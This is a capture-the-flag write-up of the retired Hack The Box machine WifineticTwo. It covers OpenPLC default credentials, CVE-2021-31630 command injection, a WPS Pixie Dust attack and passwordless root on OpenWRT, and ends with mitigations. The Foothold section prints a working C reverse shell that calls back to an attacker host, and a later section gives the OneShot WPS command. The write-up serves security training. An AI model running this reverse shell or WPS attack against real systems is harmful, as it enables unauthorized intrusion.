---
machine: WifineticTwo
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, openplc, cve-2021-31630, wifi, wps, pixie-dust, openwrt, privesc]
---

# WifineticTwo — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

OpenPLC on 8080 accepts default credentials; the `/hardware` "Hardware Layer Code Box" allows command injection and a C reverse shell gives root on `attica01`. From that container, `wlan0` is unassociated; access points are scanned and a Pixie Dust attack against WPS recovers the AP password. After joining the network, an OpenWRT with LuCI appears; the root account has no password, so direct SSH provides root. LuCI also allows adding a public key.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `8080`: Werkzeug/1.0.1 on Python 2.7.18, OpenPLC.

```bash
echo '<IP> openplc.htb' | sudo tee -a /etc/hosts
```

## Enumeration

The OpenPLC interface asks for a username and password. The default `openplc` / `<PASSWORD>` credentials log in. The panel has a `/hardware` section with the "Hardware Layer Code Box", where C code is pasted, compiled and executed by the server.

The OpenPLC Webserver v3 version is confirmed, affected by CVE-2021-31630.

## Foothold

The code box runs a C reverse shell that connects back to the attacker. When compiled and executed, the connection arrives as root because the service runs with privileges in the `attica01` container.

```c
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
int main() {
  int s = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in a = {AF_INET, htons(<LPORT>), inet_addr("<LHOST>")};
  connect(s, (struct sockaddr *)&a, sizeof(a));
  dup2(s, 0); dup2(s, 1); dup2(s, 2);
  execl("/bin/sh", "sh", NULL);
}
```

## Lateral movement

The container has an unassociated `wlan0` interface and an internal `10.0.3.0/24` network. Interfaces are enumerated and nearby access points are scanned:

```bash
iwconfig wlan0
iwlist wlan0 scan
```

An AP with WPS enabled appears. A Pixie Dust attack with OneShot recovers the WPA password without brute force.

```bash
python3 oneshot.py -i wlan0 -b <BSSID> -K
```

The password associates the interface and grants access to the AP network.

## Privilege escalation

An OpenWRT with LuCI appears at `192.168.1.1`. The root account has no password, so direct SSH provides root. LuCI also allows adding a public key to `/etc/dropbear/authorized_keys`.

```bash
ssh root@192.168.1.1
```

## Evidence

- OpenPLC with default credentials and `/hardware` reachable.
- C code compiled and a reverse shell as root on `attica01`.
- Unassociated `wlan0` and an AP with WPS.
- Pixie Dust recovering the AP password.
- LuCI at `192.168.1.1` and passwordless root.
- `id` with UID 0 on the AP.

## Lessons learned

- Default credentials on industrial systems are critical.
- OpenPLC's code box runs C as root; it is direct RCE.
- An unconfigured wireless interface can bridge to another network.
- WPS with Pixie Dust compromises the WPA password in seconds.
- An administrative panel without a password is immediate root.
- CVE-2021-31630 is the OpenPLC vulnerability; the sometimes-cited 2023-31630 does not apply.

## Mitigations and detection

- Change default credentials and restrict OpenPLC access.
- Disable the code box or run it in an isolated environment without root.
- Segment the wireless network and disable WPS.
- Set a LuCI password and disable unauthenticated root access.
- Monitor `/hardware` compilations, WPS scans and SSH connections to the AP.
- Update OpenPLC and review CVE-2021-31630.

## References

- [0xdf — WifineticTwo](https://0xdf.gitlab.io/2024/07/27/htb-wifinetictwo.html)
- [IppSec — WifineticTwo](https://www.youtube.com/watch?v=EDwHvZ6ujho)
- [Hack The Box — WifineticTwo](https://app.hackthebox.com/machines/wifinetictwo)
- [NVD — CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630)
- [Knowledge — OpenPLC and CVE-2021-31630](../../../knowledge/linux/openplc-cve-2021-31630.en.md)
